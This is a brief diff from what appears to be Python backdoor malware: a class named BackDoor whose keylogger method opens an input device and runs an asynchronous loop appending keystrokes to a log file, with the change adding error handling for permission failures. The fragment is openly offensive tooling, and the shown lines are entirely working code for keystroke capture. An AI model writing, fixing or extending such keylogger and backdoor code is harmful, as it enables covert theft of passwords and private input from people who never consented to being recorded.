@@ -177,10 +177,14 @@ class BackDoor:
             sys.exit(" Directory not found")
 
     def start_keylogger(self) -> None:
-        device = InputDevice(self.device)
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(self.keylog(device))
+        try:
+            device = InputDevice(self.device)
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(self.keylog(device))
+        except PermissionError as e:
+            sys.exit(e)
+
 
     async def keylog(self, device) -> None:
         with open(self.log, 'a+') as f:
